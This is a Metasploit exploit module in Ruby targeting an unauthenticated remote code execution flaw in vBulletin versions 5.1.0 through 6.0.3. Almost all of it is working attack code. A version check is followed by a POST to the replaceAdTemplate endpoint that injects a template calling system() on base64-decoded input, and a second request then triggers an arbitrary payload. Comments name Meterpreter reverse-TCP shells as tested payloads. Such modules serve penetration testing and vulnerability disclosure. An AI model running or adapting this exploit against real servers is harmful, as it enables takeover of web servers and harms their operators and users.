##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Payload::Php

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'vBulletin replaceAdTemplate Remote Code Execution',
        'Description' => %q{
          This module exploits a design flaw in vBulletin's AJAX API handler and template rendering system,
          present in versions 5.1.0 through 6.0.3. The vulnerability allows unauthenticated attackers
          to invoke protected controller methods via the `ajax/api/ad/replaceAdTemplate` endpoint,
          due to improper use of PHP's Reflection API in combination with changes in PHP 8.1+.

          Specifically, it targets the `vB_Api_Ad::replaceAdTemplate()` method to inject a template
          containing a `<vb:if>` conditional that evaluates attacker-supplied PHP using the
          `passthru($_POST[<param>])` construct. The malicious template is then executed via
          a second unauthenticated request to `ajax/render/ad_<location>`.

          Successful exploitation results in arbitrary command execution as the webserver user,
          without authentication. This module supports payloads for PHP, Linux, and Windows.

          Tested against vBulletin 5.1.0, 5.7.5, 6.0.1, and 6.0.3 running on PHP 8.1.
        },
        'Author' => [
          'Egidio Romano (EgiX)',   # original PoC
          'Valentin Lobstein'       # Metasploit module
        ],
        'References' => [
          ['URL', 'https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce'],
        ],
        'License' => MSF_LICENSE,
        'Platform' => %w[unix linux windows],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-05-23',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )
    return CheckCode::Unknown('Failed to retrieve page content') unless res&.code == 200

    doc = res.get_html_document

    meta = doc.at_xpath('//meta[@name="generator"]/@content')
    return CheckCode::Safe('vBulletin not detected') unless meta

    content = meta.value
    version = content[/vBulletin\s+([\d.]+)/i, 1]
    return CheckCode::Safe('vBulletin not detected') unless version

    print_status("Detected vBulletin version: #{version}")
    v = Rex::Version.new(version)

    if v < Rex::Version.new('6.0.4')
      CheckCode::Appears("vBulletin version #{v} is likely vulnerable (< 6.0.4)")
    else
      CheckCode::Safe("vBulletin version #{v} is likely patched (>= 6.0.4)")
    end
  end

  def exploit
    loc = Rex::Text.rand_text_alpha(3, 8)
    param = Rex::Text.rand_text_alpha(3, 8)

    post_data = {
      'routestring' => 'ajax/api/ad/replaceAdTemplate',
      'styleid' => '1', # Can't randomize this value
      'location' => loc,
      'template' => "<vb:if condition='\"system\"(\"base64_decode\"(\$_POST[\"#{param}\"]))'></vb:if>" # Sadly we can't use eval() here
    }

    print_status("Injecting RCE template at routestring 'ajax/render/ad_#{loc}' with POST param '#{param}'")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'vars_post' => post_data
    )

    unless res&.body&.strip == 'null'
      fail_with(Failure::UnexpectedReply, 'Failed to create RCE template (expected "null")')
    end

    print_status("Triggering payload execution via routestring 'ajax/render/ad_#{loc}'")
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'vars_post' => {
        'routestring' => "ajax/render/ad_#{loc}",
        param => Rex::Text.encode_base64(payload.encoded)
      }
    )
  end
end
